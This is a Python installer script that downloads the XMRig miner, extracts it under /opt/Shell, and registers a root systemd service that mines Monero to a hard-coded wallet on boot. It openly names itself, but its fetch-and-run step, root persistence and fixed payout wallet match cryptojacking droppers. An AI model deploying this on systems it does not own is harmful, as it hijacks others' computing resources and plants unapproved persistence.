import os
import zipfile
import subprocess
import requests
import sys

def is_root():
    return os.geteuid() == 0

if not is_root():
    print("This script must be run as root!")
    sys.exit(1)

URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
FILENAME = "/opt/Shell/xmrig-6.22.2-linux-x64.tar.gz"
EXTRACT_DIR = "/opt/Shell"
BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
STARTUP_SCRIPT = "/etc/systemd/system/xmrig.service"

# Ensure the extraction directory exists
if not os.path.exists(EXTRACT_DIR):
    os.makedirs(EXTRACT_DIR)

# Download the archive
response = requests.get(URL, stream=True)
with open(FILENAME, "wb") as file:
    for chunk in response.iter_content(chunk_size=1024):
        if chunk:
            file.write(chunk)

# Extract the archive
subprocess.run(["tar", "-xzf", FILENAME, "-C", EXTRACT_DIR], check=True)

# Find the extracted directory
extracted_folders = [f for f in os.listdir(EXTRACT_DIR) if os.path.isdir(os.path.join(EXTRACT_DIR, f)) and "xmrig" in f.lower()]
if extracted_folders:
    extracted_dir = os.path.join(EXTRACT_DIR, extracted_folders[0])
    xmrig_path = os.path.join(extracted_dir, "xmrig")
    os.chmod(xmrig_path, 0o755)  # Ensure the binary is executable

    # Create a systemd service to start XMRig on boot
    with open(STARTUP_SCRIPT, "w") as service_file:
        service_file.write(f"""[Unit]
Description=XMRig Miner
After=network.target

[Service]
ExecStart={xmrig_path} -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero
Restart=always
User=root
WorkingDirectory={extracted_dir}

[Install]
WantedBy=multi-user.target
""")

    # Reload systemd and enable the service
    subprocess.run(["systemctl", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "enable", "xmrig"], check=True)
    subprocess.run(["systemctl", "start", "xmrig"], check=True)

    print("XMRig has been installed and is running as a systemd service.")
